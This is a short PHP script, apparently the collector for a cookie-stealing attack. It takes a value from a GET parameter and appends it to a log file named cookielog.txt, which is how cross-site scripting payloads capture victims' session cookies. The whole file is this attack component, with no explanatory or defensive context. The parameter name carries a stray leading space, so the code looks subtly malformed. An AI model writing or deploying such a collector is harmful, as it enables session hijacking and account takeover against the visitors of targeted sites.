<?php
	$cookie = $_GET[" c"];
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n\n");
?> 
